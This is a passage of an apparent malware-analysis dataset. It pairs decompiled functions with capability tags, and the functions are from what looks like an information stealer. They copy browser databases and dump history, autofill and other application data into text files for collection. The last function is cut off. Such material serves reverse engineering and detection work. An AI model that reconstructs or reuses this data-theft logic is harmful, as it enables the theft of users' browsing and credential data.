        "decompiled_code": "\nvoid __cdecl fcn.0041a450(uint arg_8h, uint arg_ch)\n\n{\n    uchar *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    int32_t *in_EDX;\n    int32_t iVar9;\n    char *pcVar10;\n    uint *arg_8h_00;\n    uint var_238h;\n    uint var_234h;\n    uint var_230h;\n    uint var_22ch;\n    uint var_228h;\n    uint var_224h;\n    uint var_220h;\n    uint var_21ch;\n    uint var_218h;\n    uint var_110h;\n    uint32_t var_4h;\n    \n    var_4h = *0x454664 ^ &stack0xfffffffc;\n    var_224h = arg_ch;\n    fcn.00434d30(&var_218h, 0, 0x104);\n    (**0x457520)(&var_218h, *0x457098);\n    puVar1 = fcn.0042d6d0(0x1a);\n    *puVar1 = 0;\n    uVar2 = (**0x45758c)();\n    fcn.0042f3d4(uVar2);\n    iVar9 = 0x1a;\n    do {\n        iVar3 = fcn.0042f3e6();\n        (**0x457374)(puVar1, 0x44fa74, puVar1, iVar3 % 10);\n        iVar9 = iVar9 + -1;\n    } while (iVar9 != 0);\n    puVar1[0x1a] = 0;\n    (**0x457520)(&var_218h, puVar1);\n    (**0x4573c8)(arg_8h, &var_218h, 1);\n    fcn.00434d30(&var_110h, 0, 0x104);\n    (**0x457520)(&var_110h, 0x44c8cc);\n    (**0x457520)(&var_110h, *0x457104);\n    (**0x457520)(&var_110h, 0x44c8cc);\n    (**0x457520)(&var_110h, var_220h);\n    (**0x457520)(&var_110h, 0x44efd8);\n    arg_8h_00 = &var_110h;\n    (**0x457520)(arg_8h_00, var_224h);\n    (**0x457520)(&var_110h, \".txt\");\n    uVar2 = *0x456c24;\n    iVar9 = (**0x457344)(&var_218h, &var_228h);\n    if (iVar9 == 0) {\n        iVar9 = (**0x4572f8)(var_228h, uVar2, 0xffffffff, &var_21ch, 0);\n        if (iVar9 == 0) {\n            uVar2 = (**0x45757c)(0, 999999);\n            uVar2 = (**0x457504)(uVar2);\n            iVar9 = (**0x457314)(var_21ch);\n            while (iVar9 == 100) {\n                var_224h = (**0x457334)(var_21ch, 0);\n                puVar4 = (**0x457334)(var_21ch, 1);\n                var_220h = (**0x457334)(var_21ch, 2);\n                puVar5 = (**0x457334)(var_21ch, 3);\n                uVar6 = (**0x457334)(var_21ch, 4);\n                uVar7 = (**0x457334)(var_21ch, 5);\n                uVar8 = (**0x457334)(var_21ch, 6);\n                iVar9 = (**0x457550)(puVar4, 0x44efdc);\n                *puVar4 = 0;\n                if (iVar9 == 0) {\n                    pcVar10 = \"TRUE\";\n                }\n                else {\n                    pcVar10 = \"FALSE\";\n                }\n                (**0x457520)(puVar4, pcVar10);\n                iVar9 = (**0x457550)(puVar5, 0x44efdc);\n                *puVar5 = 0;\n                if (iVar9 == 0) {\n                    pcVar10 = \"TRUE\";\n                }\n                else {\n                    pcVar10 = \"FALSE\";\n                }\n                (**0x457520)(puVar5, pcVar10);\n                (**0x457520)(uVar2, var_224h);\n                (**0x457520)(uVar2, 0x44efe0);\n                (**0x457520)(uVar2, puVar4);\n                (**0x457520)(uVar2, 0x44efe0);\n                (**0x457520)(uVar2, var_220h);\n                (**0x457520)(uVar2, 0x44efe0);\n                (**0x457520)(uVar2, puVar5);\n                (**0x457520)(uVar2, 0x44efe0);\n                (**0x457520)(uVar2, uVar6);\n                (**0x457520)(uVar2, 0x44efe0);\n                (**0x457520)(uVar2, uVar7);\n                (**0x457520)(uVar2, 0x44efe0);\n                (**0x457520)(uVar2, uVar8);\n                (**0x457520)(uVar2, 0x44c738);\n                iVar9 = (**0x457314)(var_21ch);\n            }\n            uVar2 = (**0x457418)(uVar2);\n            if (in_EDX == NULL) {\n                *0x457814 = 0x10000;\n            }\n            else if (*in_EDX == 2) {\n                *0x457814 = fcn.0042bf30(&var_110h, uVar2, 3);\n            }\n            else {\n                *0x457814 = 0x80000;\n            }\n        }\n        (**0x457318)(var_21ch);\n        (**0x457348)(var_228h);\n    }\n    (**0x457424)(&var_218h);\n    fcn.0042d636(arg_8h_00);\n    return;\n}\n",
        "token_count": 1455
    },
    "0041a850": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041a850(uint arg_8h)\n\n{\n    uchar *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint in_ECX;\n    int32_t *in_EDX;\n    int32_t iVar5;\n    uint *arg_8h_00;\n    uint var_22ch;\n    uint var_228h;\n    uint var_224h;\n    uint var_220h;\n    uint var_21ch;\n    uint var_218h;\n    uint var_110h;\n    uint32_t var_4h;\n    \n    var_4h = *0x454664 ^ &stack0xfffffffc;\n    fcn.00434d30(&var_110h, 0, 0x104);\n    (**0x457520)(&var_110h, *0x457098);\n    puVar1 = fcn.0042d6d0(0x1a);\n    *puVar1 = 0;\n    uVar2 = (**0x45758c)();\n    fcn.0042f3d4(uVar2);\n    iVar5 = 0x1a;\n    do {\n        iVar3 = fcn.0042f3e6();\n        (**0x457374)(puVar1, 0x44fa74, puVar1, iVar3 % 10);\n        iVar5 = iVar5 + -1;\n    } while (iVar5 != 0);\n    puVar1[0x1a] = 0;\n    (**0x457520)(&var_110h, puVar1);\n    arg_8h_00 = &var_110h;\n    (**0x4573c8)();\n    fcn.00434d30(&var_218h, 0, 0x104);\n    (**0x457374)(&var_218h, \"\\\\History\\\\%s_%s.txt\", in_ECX, arg_8h);\n    uVar2 = *0x456cf0;\n    iVar5 = (**0x457344)(&var_110h, &var_220h);\n    if (iVar5 == 0) {\n        iVar5 = (**0x4572f8)(var_220h, uVar2, 0xffffffff, &var_21ch, 0);\n        if (iVar5 == 0) {\n            uVar2 = (**0x45757c)(0, 999999);\n            uVar2 = (**0x457504)(uVar2);\n            iVar5 = (**0x457314)(var_21ch);\n            while (iVar5 == 100) {\n                uVar4 = (**0x457334)(var_21ch, 0);\n                (**0x457520)(uVar2, uVar4);\n                (**0x457520)(uVar2, 0x44c738);\n                iVar5 = (**0x457314)(var_21ch);\n            }\n            uVar2 = (**0x457418)(uVar2);\n            if (in_EDX == NULL) {\n                *0x457814 = 0x10000;\n            }\n            else if (*in_EDX == 2) {\n                *0x457814 = fcn.0042bf30(&var_218h, uVar2, 3);\n            }\n            else {\n                *0x457814 = 0x80000;\n            }\n        }\n        (**0x457318)(var_21ch);\n        (**0x457348)(var_220h);\n    }\n    (**0x457424)(&var_110h);\n    fcn.0042d636(arg_8h_00);\n    return;\n}\n",
        "token_count": 805
    },
    "0041aa70": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041aa70(uint arg_8h, uint arg_ch)\n\n{\n    uchar *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint in_ECX;\n    int32_t *in_EDX;\n    int32_t iVar7;\n    uint var_22ch;\n    uint var_228h;\n    uint var_224h;\n    uint var_220h;\n    uint var_21ch;\n    uint var_218h;\n    uint var_110h;\n    uint32_t var_4h;\n    \n    var_4h = *0x454664 ^ &stack0xfffffffc;\n    fcn.00434d30(&var_110h, 0, 0x104);\n    (**0x457520)(&var_110h, *0x457098);\n    puVar1 = fcn.0042d6d0(0x1a);\n    *puVar1 = 0;\n    uVar2 = (**0x45758c)();\n    fcn.0042f3d4(uVar2);\n    iVar7 = 0x1a;\n    do {\n        iVar3 = fcn.0042f3e6();\n        (**0x457374)(puVar1, 0x44fa74, puVar1, iVar3 % 10);\n        iVar7 = iVar7 + -1;\n    } while (iVar7 != 0);\n    puVar1[0x1a] = 0;\n    (**0x457520)(&var_110h, puVar1);\n    uVar2 = 1;\n    (**0x4573c8)(arg_8h, &var_110h);\n    fcn.00434d30(&var_218h, 0, 0x104);\n    (**0x457374)(&var_218h, \"\\\\Autofill\\\\%s_%s.txt\", in_ECX, arg_ch);\n    uVar4 = *0x456aa8;\n    iVar7 = (**0x457344)(&var_110h, &var_220h);\n    if (iVar7 == 0) {\n        iVar7 = (**0x4572f8)(var_220h, uVar4, 0xffffffff, &var_21ch, 0);\n        if (iVar7 == 0) {\n            uVar4 = (**0x45757c)(0, 999999);\n            uVar4 = (**0x457504)(uVar4);\n            iVar7 = (**0x457314)(var_21ch);\n            while (iVar7 == 100) {\n                uVar5 = (**0x457334)(var_21ch, 0);\n                uVar6 = (**0x457334)(var_21ch, 1);\n                (**0x457520)(uVar4, uVar5);\n                (**0x457520)(uVar4, 0x44efe0);\n                (**0x457520)(uVar4, uVar6);\n                (**0x457520)(uVar4, 0x44c738);\n                iVar7 = (**0x457314)(var_21ch);\n            }\n            uVar4 = (**0x457418)(uVar4);\n            if (in_EDX == NULL) {\n                *0x457814 = 0x10000;\n            }\n            else if (*in_EDX == 2) {\n                *0x457814 = fcn.0042bf30(&var_218h, uVar4, 3);\n            }\n            else {\n                *0x457814 = 0x80000;\n            }\n        }\n        (**0x457318)(var_21ch);\n        (**0x457348)(var_220h);\n    }\n    (**0x457424)(&var_110h);\n    fcn.0042d636(uVar2);\n    return;\n}\n",
        "token_count": 865
    },
    "0041acd0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_588h\n// WARNING: Variable defined which should be unmapped: var_584h\n// WARNING: Variable defined which should be unmapped: var_580h\n// WARNING: Variable defined which should be unmapped: var_57ch\n// WARNING: Variable defined which should be unmapped: var_58ch\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0041acd0(uint *arg_8h, uint *arg_ch, uint arg_10h, uint *arg_14h, uint arg_18h, uint *arg_1ch, uint arg_20h, \n            int32_t arg_24h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *unaff_EBX;\n    uint *unaff_ESI;\n    uint unaff_EDI;\n    uint *arg_8h_00;\n    uint *arg_ch_00;\n    uint arg_10h_00;\n    uint *arg_14h_00;\n    int32_t var_58ch;\n    uint *var_588h;\n    uint *var_584h;\n    uint var_580h;\n    uint *var_57ch;\n    uint *var_578h;\n    uint var_574h;\n    uint var_570h;\n    uint var_56ch;\n    uint var_568h;\n    uint var_53ch;\n    uint var_428h;\n    uint var_320h;\n    uint var_218h;\n    uint var_110h;\n    uint32_t var_4h;\n    \n    var_4h = *0x454664 ^ &stack0xfffffffc;\n    var_578h = arg_8h;\n    var_584h = arg_ch;\n    (**0x457374)(&fcn.0041acd0::var_428h, \"%s\\\\*\", arg_ch);\n    var_588h = (**0x4575e0)(&fcn.0041acd0::var_428h, &fcn.0041acd0::var_568h);\n    var_58ch = 0;\n    if (var_588h != 0xffffffff) {\n        do {\n            arg_ch_00 = 0x44eba0;\n            arg_8h_00 = &fcn.0041acd0::var_53ch;\n            iVar2 = (**0x457550)();\n            if ((iVar2 != 0) && (iVar2 = (**0x457550)(&fcn.0041acd0::var_53ch, 0x44eba4),  iVar2 != 0)) {\n                (**0x457374)(&fcn.0041acd0::var_110h, \"%s\\\\%s\", var_584h, &fcn.0041acd0::var_53ch);\n                fcn.00434d30(&fcn.0041acd0::var_218h, 0, 0x104);\n                (**0x457374)(&fcn.0041acd0::var_218h, \"%s\\\\%s\\\\%s\\\\%s\", var_584h, &fcn.0041acd0::var_53ch, *0x457110, \n                             *0x456a8c);\n                fcn.00434d30(&fcn.0041acd0::var_320h, 0, 0x104);\n                (**0x457374)(&fcn.0041acd0::var_320h, \"%s\\\\%s\\\\%s\", var_584h, *0x457110, *0x456a8c);\n                iVar3 = (**0x457550)(&fcn.0041acd0::var_53ch, *0x456d28);\n                iVar2 = *0x456a8c;\n                if (iVar3 == 0) {\n                    var_588h = var_578h;\n                    var_57ch = 0x41ae84;\n                    fcn.00418e20(var_578h, arg_14h, arg_18h);\n                    if ((arg_24h != 0) && (var_58ch == 0)) {\n                        var_584h = 0x44c726;\n                        var_588h = &fcn.0041acd0::var_320h;\n                        fcn.00419220(var_588h, 0x44c726, arg_10h, arg_1ch);\n                        var_57ch = arg_1ch;\n                    }\n                    var_58ch = arg_24h;\n                    unaff_EDI = arg_18h;\n                    unaff_ESI = arg_1ch;\n                    unaff_EBX = arg_14h;\n                    fcn.0041acd0(&fcn.0041acd0::var_53ch, &fcn.0041acd0::var_110h, arg_10h, var_57ch, arg_18h, arg_1ch, \n                                 arg_14h, arg_24h);\n                    arg_14h = var_57ch;\n                }\n                else {\n                    var_578h = 0x41af0d;\n                    iVar3 = (**0x457550)();\n                    if (iVar3 == 0) {\n                        arg_ch_00 = 0x41af0d;\n                        arg_8h_00 = &fcn.0041acd0::var_110h;\n                        arg_10h_00 = arg_10h;\n                        arg_14h_00 = arg_1ch;\n                        fcn.00419220(arg_8h_00, 0x41af0d, arg_10h, arg_1ch);\n                    }\n                    else {\n                        arg_14h_00 = &fcn.0041acd0::var_218h;\n                        arg_10h_00 = 0x41af40;\n                        uVar4 = (**0x457470)();\n                        puVar1 = *0x456dcc;\n                        if ((uVar4 == 0xffffffff) || ((uVar4 & 0x10) != 0)) {\n                            var_584h = 0x41afa2;\n                            iVar3 = (**0x457550)();\n                            if (iVar3 == 0) {\n                                if (*(iVar2 + 2) != '\\0') {\n                                    fcn.00419d10(0x41af0d);\n                                    fcn.00419f60(&fcn.0041acd0::var_110h, 0x41af0d);\n                                    arg_1ch = &fcn.0041acd0::var_53ch;\n                                    arg_14h = puVar1;\n                                }\n                            }\n                            else {\n                                iVar3 = (**0x457550)(&fcn.0041acd0::var_53ch, *0x456b24);\n                                if (iVar3 == 0) {\n                                    if (*(iVar2 + 1) != '\\0') {\n                                        fcn.00419730(&fcn.0041acd0::var_110h, 0x41af0d, arg_18h, arg_1ch);\n                                        fcn.00419ac0(0x41af0d);\n                                        arg_1ch = &fcn.0041acd0::var_53ch;\n                                        arg_14h = puVar1;\n                                    }\n                                }\n                                else if ((var_568h & 0x10) == 0) goto code_r0x0041b0a6;\n                            }\n                        }\n                        else {\n                            var_584h = &fcn.0041acd0::var_53ch;\n                            var_588h = &fcn.0041acd0::var_218h;\n                            fcn.00419220(var_588h, var_584h, arg_10h, arg_1ch);\n                            var_58ch = arg_24h;\n                            arg_ch_00 = &fcn.0041acd0::var_110h;\n                            arg_8h_00 = &fcn.0041acd0::var_53ch;\n                            arg_10h_00 = arg_10h;\n                            arg_14h_00 = arg_14h;\n                            unaff_EDI = arg_18h;\n                            unaff_ESI = arg_1ch;\n                            unaff_EBX = &fcn.0041acd0::var_53ch;\n                        }\n                    }\n                    fcn.0041acd0(arg_8h_00, arg_ch_00, arg_10h_00, arg_14h_00, unaff_EDI, unaff_ESI, unaff_EBX, var_58ch\n                                );\n                }\ncode_r0x0041b0a6:\n                fcn.00434d30(&fcn.0041acd0::var_218h, 0, 0x104);\n                fcn.00434d30(&fcn.0041acd0::var_320h, 0, 0x104);\n            }\n            iVar2 = (**0x457438)(var_588h, &fcn.0041acd0::var_568h);\n        } while (iVar2 != 0);\n        (**0x4573a8)(var_588h);\n    }\n    fcn.0042d636(unaff_ESI);\n    return;\n}\n",
        "token_count": 2035
    },
    "0041be70": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h_2\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0041be70(int32_t noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6\n            , uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, \n            uint noname_13, uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, \n            uint noname_19, uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint noname_24, \n            uint noname_25, uint noname_26, uint noname_27, uint noname_28, uint noname_29, uint noname_30, \n            uint noname_31, uint noname_32, uint noname_33, uint noname_34, uint noname_35, uint noname_36, \n            uint noname_37, uint noname_38, uint noname_39, uint noname_40, uint noname_41, uint noname_42, \n            uint noname_43, uint noname_44, uint noname_45, uint noname_46, uint noname_47, uint noname_48, \n            uint noname_49, uint noname_50, uint noname_51, uint arg_8h)\n\n{\n    char cVar1;\n    ushort *puVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    uint uVar5;\n    uint *puVar6;\n    ushort *puVar7;\n    char *arg_8h_00;\n    int32_t *in_FS_OFFSET;\n    uint var_4h_2;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    uint var_1090h_2;\n    ushort *var_108ch_2;\n    ushort *var_1088h_2;\n    uint var_1084h;\n    ushort *var_107ch_3;\n    uint var_1078h;\n    uint var_108ch;\n    uint32_t var_1088h;\n    uint32_t var_105ch_2;\n    uint var_107ch_2;\n    uint uStackY4176;\n    uint32_t var_1048h_2;\n    uint32_t var_1040h;\n    uint var_1030h;\n    uint32_t var_102ch;\n    uint32_t var_1024h;\n    uint var_1014h;\n    uint32_t var_1010h;\n    uint32_t var_1008h;\n    uint var_ff8h;\n    uint32_t var_ff4h;\n    uint32_t var_fech;\n    uint var_fdch;\n    uint32_t var_fd8h;\n    uint32_t var_fd0h;\n    ushort *var_fc4h;\n    ushort *var_1090h;\n    uint32_t var_fbch;\n    uchar auStackY4024 [8];\n    uint var_107ch;\n    uint var_105ch;\n    uint var_104ch;\n    uint var_1048h;\n    uint var_fb4h;\n    uint var_bcch_3;\n    uint var_bcch_2;\n    uint var_bcch;\n    uint var_7e4h;\n    char acStackY1024 [36];\n    uint var_3fch_2;\n    uint var_3fch;\n    uint uStackY244;\n    uint32_t in_stack_ffffff2c;\n    uint in_stack_ffffff30;\n    uint *in_stack_ffffff34;\n    uint in_stack_ffffff38;\n    uchar *arg_8h_01;\n    uint32_t in_stack_ffffff50;\n    uint in_stack_ffffff54;\n    uint in_stack_ffffff58;\n    uint in_stack_ffffff5c;\n    uint var_14h_2;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h_3;\n    \n    var_4h_3 = 0xffffffff;\n    uStack12 = 0x442935;\n    var_ch_2 = *in_FS_OFFSET;\n    fcn.0043c480();\n    *in_FS_OFFSET = &fcn.0041be70::var_ch_2;\n    fcn.00434d30();\n    iVar3 = (**0x457500)();\n    var_1048h_2 = 0xf;\n    uStackY4176 = 0;\n    var_105ch_2 = var_105ch_2 & 0xffffff00;\n    arg_8h_00 = (iVar3 < 0) - 1 & &stack0xfffff048;\n    pcVar4 = arg_8h_00;\n    do {\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(arg_8h_00, pcVar4 - (arg_8h_00 + 1));\n    var_4h_3 = 0;\n    fcn.00434d30();\n    fcn.00434d30();\n    fcn.00434d30();\n    (**0x457500)();\n    (**0x457520)();\n    (**0x457520)();\n    (**0x457520)();\n    fcn.00434d30();\n    (**0x457500)();\n    (**0x457520)();\n    (**0x457520)();\n    (**0x457520)();\n    var_107ch_3 = &stack0xffffff50;\n    pcVar4 = &stack0xfffffc00;\n    in_stack_ffffff50 = in_stack_ffffff50 & 0xffffff00;\n    do {\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    iVar3 = pcVar4 - &stack0xfffffc01;\n    arg_8h_01 = &stack0xfffffc00;\n    fcn.004090e0(arg_8h_01, iVar3);\n    fcn.004243e0(arg_8h_01, iVar3, in_stack_ffffff50, in_stack_ffffff54, in_stack_ffffff58, in_stack_ffffff5c);\n    var_4h_3._0_1_ = 1;\n    var_107ch_3 = var_1088h_2;\n    puVar7 = var_108ch_2;\n    if (var_108ch_2 != var_1088h_2) {\n        do {\n            var_fd0h = var_fd0h & 0xffff0000;\n            var_fbch = 7;\n            var_1090h = NULL;\n            fcn.004170c0(puVar7, 0);\n            var_4h_3._0_1_ = 2;\n            fcn.00424090();\n            var_4h_3._0_1_ = 3;\n            in_stack_ffffff34 = &fcn.0041be70::var_1024h;\n            in_stack_ffffff30 = 0x41c0db;\n            fcn.00414be0(in_stack_ffffff34, &fcn.0041be70::var_105ch_2, *0x456e68);\n            var_4h_3._0_1_ = 4;\n            fcn.004097a0(&fcn.0041be70::var_1008h);\n            var_4h_3._0_1_ = 5;\n            uVar5 = fcn.00424090();\n            var_4h_3._0_1_ = 6;\n            in_stack_ffffff38 = 0x41c121;\n            puVar6 = fcn.00409750(uVar5);\n            var_4h_3 = CONCAT31(var_4h_3._1_3_, 7);\n            if (0xf < puVar6[5]) {\n                puVar6 = *puVar6;\n            }\n            if (*(noname_0 + 0x20) == NULL) {\n                *0x457814 = 0x10000;\n            }\n            else if (**(noname_0 + 0x20) == 2) {\n                in_stack_ffffff38 = 0;\n                in_stack_ffffff30 = 0x41c175;\n                *0x457814 = fcn.0042bf30(puVar6, 0, 2);\n            }\n            else {\n                *0x457814 = 0x80000;\n            }\n            if (0xf < var_102ch) {\n                fcn.0042d62b();\n            }\n            var_102ch = 0xf;\n            var_1030h = 0;\n            var_1040h = var_1040h & 0xffffff00;\n            if (0xf < var_fd8h) {\n                fcn.0042d62b();\n            }\n            var_fd8h = 0xf;\n            var_fdch = 0;\n            var_fech = var_fech & 0xffffff00;\n            if (0xf < var_ff4h) {\n                fcn.0042d62b();\n            }\n            var_ff4h = 0xf;\n            var_ff8h = 0;\n            var_1008h = var_1008h & 0xffffff00;\n            if (0xf < var_1010h) {\n                fcn.0042d62b();\n            }\n            var_1010h = 0xf;\n            var_1014h = 0;\n            var_1024h = var_1024h & 0xffffff00;\n            if (0xf < var_1088h) {\n                fcn.0042d62b();\n            }\n            var_4h_3._0_1_ = 1;\n            if (7 < var_fbch) {\n                fcn.0042d62b();\n            }\n            puVar7 = puVar7 + 0xe;\n        } while (puVar7 != var_107ch_3);\n    }\n    var_107ch_3 = &stack0xffffff2c;\n    puVar6 = &fcn.0041be70::var_bcch_3;\n    in_stack_ffffff2c = in_stack_ffffff2c & 0xffffff00;\n    do {\n        cVar1 = *puVar6;\n        puVar6 = puVar6 + 1;\n    } while (cVar1 != '\\0');\n    iVar3 = puVar6 - (&fcn.0041be70::var_bcch_3 + 1);\n    puVar6 = &fcn.0041be70::var_bcch_3;\n    fcn.004090e0(puVar6, iVar3);\n    puVar6 = fcn.004243e0(puVar6, iVar3, in_stack_ffffff2c, in_stack_ffffff30, in_stack_ffffff34, in_stack_ffffff38);\n    if (&fcn.0041be70::var_108ch_2 != puVar6) {\n        if (var_108ch_2 != NULL) {\n            fcn.00417240();\n            fcn.0042d62b();\n        }\n        var_108ch_2 = *puVar6;\n        var_1088h_2 = puVar6[1];\n        var_1084h = puVar6[2];\n        *puVar6 = 0;\n        puVar6[1] = 0;\n        puVar6[2] = 0;\n    }\n    puVar7 = var_1090h;\n    var_4h_3 = CONCAT31(var_4h_3._1_3_, 1);\n    if (var_fc4h != NULL) {\n        for (; var_fc4h != puVar7; var_fc4h = var_fc4h + 0xe) {\n            if (7 < *(var_fc4h + 10)) {\n                fcn.0042d62b();\n            }\n            *(var_fc4h + 10) = 7;\n            *(var_fc4h + 8) = 0;\n            *var_fc4h = 0;\n        }\n        fcn.0042d62b();\n    }\n    var_107ch_3 = var_1088h_2;\n    puVar7 = var_108ch_2;\n    if (var_108ch_2 != var_1088h_2) {\n        do {\n            var_fd0h = var_fd0h & 0xffff0000;\n            var_fbch = 7;\n            var_1090h = NULL;\n            fcn.004170c0(puVar7, 0);\n            var_4h_3._0_1_ = 9;\n            fcn.00424090();\n            var_4h_3._0_1_ = 10;\n            uStackY244 = 0x41c3ec;\n            fcn.00414be0(&fcn.0041be70::var_1040h, &fcn.0041be70::var_105ch_2, *0x456ffc);\n            var_4h_3._0_1_ = 0xb;\n            fcn.004097a0(&fcn.0041be70::var_fech);\n            var_4h_3._0_1_ = 0xc;\n            uVar5 = fcn.00424090();\n            var_4h_3._0_1_ = 0xd;\n            puVar6 = fcn.00409750(uVar5);\n            var_4h_3 = CONCAT31(var_4h_3._1_3_, 0xe);\n            if (0xf < puVar6[5]) {\n                puVar6 = *puVar6;\n            }\n            if (*(noname_0 + 0x20) == NULL) {\n                *0x457814 = 0x10000;\n            }\n            else if (**(noname_0 + 0x20) == 2) {\n                uStackY244 = 0x41c486;\n                *0x457814 = fcn.0042bf30(puVar6, 0, 2);\n            }\n            else {\n                *0x457814 = 0x80000;\n            }\n            if (0xf < var_1010h) {\n                fcn.0042d62b();\n            }\n            var_1010h = 0xf;\n            var_1014h = 0;\n            var_1024h = var_1024h & 0xffffff00;\n            if (0xf < var_ff4h) {\n                fcn.0042d62b();\n            }\n            var_ff4h = 0xf;\n            var_ff8h = 0;\n            var_1008h = var_1008h & 0xffffff00;\n            if (0xf < var_fd8h) {\n                fcn.0042d62b();\n            }\n            var_fd8h = 0xf;\n            var_fdch = 0;\n            var_fech = var_fech & 0xffffff00;\n            if (0xf < var_102ch) {\n                fcn.0042d62b();\n            }\n            var_102ch = 0xf;\n            var_1030h = 0;\n            var_1040h = var_1040h & 0xffffff00;\n            if (0xf < var_1088h) {\n                fcn.0042d62b();\n            }\n            var_4h_3 = CONCAT31(var_4h_3._1_3_, 1);\n            if (7 < var_fbch) {\n                fcn.0042d62b();\n            }\n            puVar7 = puVar7 + 0xe;\n        } while (puVar7 != var_107ch_3);\n    }\n    puVar2 = var_1088h_2;\n    puVar7 = var_108ch_2;\n    if (var_108ch_2 != NULL) {\n        for (; puVar7 != puVar2; puVar7 = puVar7 + 0xe) {\n            if (7 < *(puVar7 + 10)) {\n                fcn.0042d62b();\n            }\n            *(puVar7 + 10) = 7;\n            *(puVar7 + 8) = 0;\n            *puVar7 = 0;\n        }\n        fcn.0042d62b();\n    }\n    var_108ch_2 = NULL;\n    var_1088h_2 = NULL;\n    var_1084h = 0;\n    if (0xf < var_1048h_2) {\n        fcn.0042d62b();\n    }\n    *in_FS_OFFSET = var_ch_2;\n    fcn.0042d636(in_stack_ffffff34);\n    return;\n}\n",
        "token_count": 3795
    },
    "0041c630": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041c630(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint arg_8h_00;\n    int32_t iVar4;\n    int32_t in_ECX;\n    uint unaff_ESI;\n    uint var_964h;\n    uint var_960h;\n    uint var_95ch;\n    uint var_958h;\n    uint var_954h;\n    uint var_950h;\n    uint var_924h;\n    uint var_810h;\n    uint var_428h;\n    uint var_320h;\n    uint var_218h;\n    uint var_110h;\n    uint32_t var_4h;\n    \n    var_4h = *0x454664 ^ &stack0xfffffffc;\n    (**0x457374)(&var_428h, \"%s\\\\*\", arg_ch);\n    iVar1 = (**0x4575e0)(&var_428h, &var_950h);\n    if (iVar1 != -1) {\n        do {\n            iVar2 = (**0x457550)(&var_924h, 0x44eba0);\n            if (iVar2 != 0) {\n                iVar2 = (**0x457550)(&var_924h, 0x44eba4);\n                if (iVar2 != 0) {\n                    (**0x457374)(&var_320h, \"%s\\\\%s\", arg_ch, &var_924h);\n                    iVar2 = (**0x457550)(arg_8h, 0x44c726);\n                    if (iVar2 == 0) {\n                        (**0x457374)(&var_218h, 0x44ebdc, &var_924h);\n                    }\n                    else {\n                        (**0x457374)(&var_218h, \"%s\\\\%s\", arg_8h, &var_924h);\n                    }\n                    iVar2 = (**0x45741c)(&var_924h, arg_10h);\n                    if (iVar2 != 0) {\n                        fcn.00434d30(&var_810h, 0, 1000);\n                        (**0x457520)(&var_810h, \"\\\\Soft\\\\\");\n                        (**0x457520)(&var_810h, arg_14h);\n                        (**0x457520)(&var_810h, 0x44c8cc);\n                        (**0x457520)(&var_810h, &var_218h);\n                        fcn.00434d30(&var_110h, 0, 0x104);\n                        (**0x457520)(&var_110h, *0x457098);\n                        puVar3 = fcn.0042d6d0(0x1a);\n                        *puVar3 = 0;\n                        arg_8h_00 = (**0x45758c)();\n                        fcn.0042f3d4(arg_8h_00);\n                        iVar2 = 0x1a;\n                        do {\n                            iVar4 = fcn.0042f3e6();\n                            (**0x457374)(puVar3, 0x44fa74, puVar3, iVar4 % 10);\n                            iVar2 = iVar2 + -1;\n                        } while (iVar2 != 0);\n                        puVar3[0x1a] = 0;\n                        (**0x457520)(&var_110h, puVar3);\n                        (**0x4573c8)(&var_320h, &var_110h, 1);\n                        if (*(in_ECX + 0x20) == NULL) {\n                            *0x457814 = 0x10000;\n                        }\n                        else if (**(in_ECX + 0x20) == 2) {\n                            *0x457814 = fcn.0042bf30(&var_810h, 0, 2);\n                        }\n                        else {\n                            *0x457814 = 0x80000;\n                        }\n                        (**0x457424)(&var_110h);\n                    }\n                    fcn.0041c630(&var_218h, &var_320h, arg_10h, arg_14h);\n                }\n            